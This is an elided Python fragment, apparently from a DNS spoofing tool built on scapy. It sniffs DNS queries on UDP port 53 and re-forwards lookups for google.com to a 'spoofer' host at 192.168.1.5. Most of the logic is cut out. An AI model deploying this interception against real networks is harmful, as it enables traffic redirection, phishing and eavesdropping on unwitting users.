...
def forwardDnsSpoofing(spooferIP):
    def forwardDNS(orgPacket: IP):
        ...
        if orgPacket[DNSQR].qname == b'google.com.':
            ...
            newPacket = IP(dst=spooferIP) / UDP(sport=orgPacket[UDP].sport, dport=5353) / DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
...
def main():
    ...
    while True:
        ...
        scapy.sniff(prn=forwardDnsSpoofing("192.168.1.5"), filter='udp port 53', iface=interface, store=0, timeout=2, count=1)
